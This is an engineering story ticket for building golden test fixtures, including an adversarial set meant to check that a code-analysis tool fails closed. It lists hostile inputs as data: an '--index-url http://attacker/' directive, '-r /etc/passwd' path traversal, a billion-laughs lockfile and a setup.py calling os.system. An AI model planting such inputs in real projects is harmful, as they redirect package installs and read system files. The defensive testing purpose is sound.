# Story S7-04 — Build the golden fixture portfolio (clean + adversarial + polyglot)

**Step:** Step 7 — Land the `tests/conformance/` tier and the `LanguagePack` contract-snapshot fence
**Status:** Ready
**Effort:** L
**Depends on:** S7-02
**ADRs honored:** ADR-0010, ADR-0007, ADR-0008, ADR-0009, ADR-0011

## Context
The conformance tier (S7-02) is only as strong as its fixtures: `test_search_adapter_is_not_a_stub` is meaningless against a fixture with no cross-file references, and "fails closed on hostile input" cannot be verified without hostile inputs. This story lands the *mandatory per-language golden discipline* — one clean fixture + committed golden `RepoContext` per language under `tests/golden/languages/{typescript,python}/`, the adversarial set (hostile `requirements.txt`, oversized/billion-laughs lockfiles, hostile `setup.py`, bidi/zero-width package names), a polyglot fixture, the golden-regen idempotence test, and the fixture-shape meta-test that guarantees every fixture is rich enough to defeat a stub adapter.

## References — where to look
- **Architecture:** `../phase-arch-design.md §Testing strategy — Golden files` — mandatory fixture repo + committed golden `RepoContext` per language under `tests/golden/languages/{typescript,python}/`; the golden-regen idempotence test; the fixture-shape meta-test (≥1 cross-file ref + ≥1 dep edge).
- **Architecture:** `../phase-arch-design.md §Testing strategy — Fixture portfolio` — per language: one clean fixture + the adversarial set + a polyglot fixture; the exact hostile inputs enumerated.
- **Architecture:** `../phase-arch-design.md §Edge cases #1,#2,#4,#5,#6,#7,#8,#14` — polyglot isolation, bare `*.py` tree, oversized/billion-laughs lockfile, hostile `setup.py`, `--index-url`, out-of-tree `-r`, unknown directive, bidi/zero-width.
- **Architecture:** `../phase-arch-design.md §Open questions deferred to implementation — 1, 2, 5` — fixture sizing (OQ1), `tsx`/`javascript` coverage minimum (OQ2), polyglot adapter dispatch is Phase-8 territory — ship only the polyglot-isolation assertion (OQ5).
- **Phase ADRs:** `../ADRs/0010-conformance-tier-parameterized-over-live-registry.md` — ADR-0010 — adversarial fixtures are first-class conformance cases; the fixture-shape meta-test backs `test_search_adapter_is_not_a_stub`.
- **Phase ADRs:** `../ADRs/0011-python-search-adapter-tree-sitter-first-scip-deferred.md` — ADR-0011 — the fixture-shape meta-test (≥1 cross-file ref, ≥1 dep edge) is named here as the guard against a degenerate adapter passing.
- **Phase ADRs:** `../ADRs/0009-requirements-txt-directive-language-parsing-contract.md` — ADR-0009 — the hostile `requirements.txt` directives the adversarial fixture must contain.
- **Phase ADRs:** `../ADRs/0007-python-probes-hardened-parse-only-no-exec.md` — ADR-0007 — the hostile `setup.py` fixture must never be executed.
- **Existing code:** `tests/golden/` — `test_goldens_match.py`, `test_golden_count_matches.py`, `test_regen_golden_portfolio_idempotent.py`, `tests/golden/contracts/` — the golden-match + count + regen-idempotence patterns to mirror.
- **Existing code:** `tests/conformance/test_language_conformance.py` (S7-02) — `test_golden_matches` and `test_detector_detects_own_fixture` consume these fixtures; the session-scoped gather points at `tests/golden/languages/{language}/`.

## Goal
Land per-language fixtures + committed golden `RepoContext` files under `tests/golden/languages/`, the adversarial set, a polyglot fixture, a golden-regen idempotence test, and a fixture-shape meta-test.

## Acceptance criteria
- [ ] The TDD red test exists (the fixture-shape meta-test), is committed, and was observed failing before the fixtures existed / before they were rich enough.
- [ ] `tests/golden/languages/typescript/` and `tests/golden/languages/python/` each contain one clean fixture repo + its committed golden `RepoContext` (`repo-context.yaml` + raw probe outputs as the existing golden discipline requires).
- [ ] The fixture-shape meta-test asserts every per-language fixture has ≥1 cross-file reference and ≥1 dependency edge — so a stub search adapter cannot pass `test_search_adapter_is_not_a_stub`.
- [ ] The adversarial set is present and committed: hostile `requirements.txt` (`-e .`, `git+https://...`, `--index-url http://attacker/`, `--extra-index-url`, `-r /etc/passwd`, `-r ../../../etc/passwd`, an unknown directive), an oversized (>5 MiB) and a billion-laughs lockfile, a hostile `setup.py` (`os.system`/`subprocess`/`__import__`), and a bidi/zero-width-injected package name; each is a conformance case where "fails closed" is part of *passing*.
- [ ] A polyglot fixture (Node + Python) exists and a polyglot-isolation conformance assertion verifies no cross-language slice clobbering (per-probe sub-schema isolation holds).
- [ ] A golden-regen idempotence test asserts a re-gather of each fixture produces a byte-identical golden.
- [ ] The TypeScript fixture exercises at least `typescript` + one of `tsx`/`javascript` (OQ2) so the three-grammar `TS_PACK.grammars` tuple is not a paper claim.
- [ ] The session-fixture gather over all fixtures stays inside `make check`'s wall-clock envelope (OQ1); `ruff`/`mypy --strict` clean on touched test code; `make fence` + `import-linter` green.

## Implementation outline
1. Create `tests/golden/languages/python/clean/` — a small Python repo with `pyproject.toml`, ≥2 modules with a cross-file `import`, and ≥1 pinned dependency (a `requirements.txt` or `pyproject` dep producing a dep edge).
2. Create `tests/golden/languages/typescript/clean/` — a small TS repo exercising `typescript` + `tsx`/`javascript`, ≥1 cross-file ref, ≥1 dep edge.
3. Generate and commit the golden `RepoContext` for each clean fixture via the existing golden-regen mechanism.
4. Create the adversarial fixtures under `tests/golden/languages/python/adversarial/` (and TS where applicable) — one per hostile case enumerated above.
5. Create `tests/golden/languages/polyglot/` — a repo with both Node and Python markers.
6. Write `test_fixture_shape.py` — the meta-test asserting ≥1 cross-file ref + ≥1 dep edge per fixture.
7. Write / extend the golden-regen idempotence test for the new language goldens.
8. Wire the polyglot-isolation conformance assertion into `test_language_conformance.py`.

## TDD plan — red / green / refactor
### Red — write the failing test first
Test file: `tests/golden/languages/test_fixture_shape.py`.
- `test_every_fixture_has_cross_file_ref_and_dep_edge` — for each fixture under `tests/golden/languages/`, gather it and assert the resulting `RepoContext` has ≥1 cross-file import reference and ≥1 dependency-graph edge.
```python
@pytest.mark.parametrize("fixture_dir", _discover_language_fixtures())
def test_every_fixture_has_cross_file_ref_and_dep_edge(fixture_dir) -> None:
    # arrange: gather the fixture
    ctx = gather(fixture_dir)
    # act + assert: the fixture is rich enough to defeat a stub adapter
    assert _cross_file_ref_count(ctx) >= 1, f"{fixture_dir}: a stub adapter would pass"
    assert _dep_edge_count(ctx) >= 1, f"{fixture_dir}: no dep edge — test_dep_graph is hollow"
```
This fails until rich-enough fixtures exist. A second red test — `test_golden_regen_is_idempotent` for the new language goldens — fails until the goldens are committed.

### Green — make it pass
Author the clean / adversarial / polyglot fixtures and commit their goldens. Make the fixtures genuinely rich (≥1 cross-file ref, ≥1 dep edge) so the meta-test passes for the right reason. Wire the polyglot-isolation assertion.

### Refactor — clean up
Add README-style comments in each adversarial fixture naming the hostile case and the expected fail-closed behavior. Extract `_discover_language_fixtures` / `_cross_file_ref_count` / `_dep_edge_count` as pure helpers. Keep fixtures *minimal* — large enough to defeat a stub, small enough for the session gather (OQ1); the meta-test is the lower bound, wall-clock the upper.

## Files to touch
| Path | Why |
|---|---|
| `tests/golden/languages/python/clean/**` | New — clean Python fixture repo. |
| `tests/golden/languages/typescript/clean/**` | New — clean TS fixture repo (exercises `tsx`/`javascript`). |
| `tests/golden/languages/python/adversarial/**` | New — hostile `requirements.txt` / lockfiles / `setup.py` / bidi name. |
| `tests/golden/languages/polyglot/**` | New — Node + Python polyglot fixture. |
| `tests/golden/languages/*/golden/**` | New — committed golden `RepoContext` per fixture. |
| `tests/golden/languages/test_fixture_shape.py` | New — the fixture-shape meta-test (≥1 cross-file ref, ≥1 dep edge). |
| `tests/golden/languages/test_golden_regen_idempotent.py` | New / extended — re-gather → byte-identical golden. |
| `tests/conformance/test_language_conformance.py` | Add the polyglot-isolation assertion. |

## Out of scope
- `test_language_probes_actually_dispatched` — S7-03.
- The `LanguagePack` contract-snapshot fence — S7-05.
- The multi-language *workflow* coordination story (which adapter answers which query for a polyglot repo) — Phase-8 / ADR-0032 territory (OQ5); ship only the *isolation* assertion.
- The e2e slice row — S8-01.

## Notes for the implementer
- OQ1 is the central tension: the fixture must defeat a stub adapter (≥1 cross-file ref, ≥1 dep edge — the meta-test's *lower* bound) yet keep the session gather inside `make check` (the *upper* bound). Size deliberately; do not over-build the fixtures.
- The oversized / billion-laughs lockfiles must be *generated* committed artifacts or generated at fixture-build time — a literal 200 MB file in git is unacceptable; prefer a small file plus a generator, or a depth-bomb that is small on disk but expands on parse. Confirm the byte/depth caps reject them *before* parse (no OOM, no hang).
- The hostile `setup.py` must contain `os.system`/`subprocess`/`__import__` — the conformance pass condition is that it is *read as text and never executed*; pair it with the S4-06 AST test, do not duplicate it.
- The bidi/zero-width package name exercises the *existing* two-pass sanitizer (edge case #14) — no Python-specific sanitizer change; the golden must show the neutralized output.
- `tests/golden/languages/` is a mandatory per-language deliverable for every future language (Phase 8+ handoff) — establish the directory layout cleanly; future languages copy it.
- Golden-regen idempotence depends on `LanguageRegistry.all()` being sorted (S2-01) and the deterministic pipeline — a flaky golden almost always means a non-deterministic ordering somewhere, not a fixture problem.
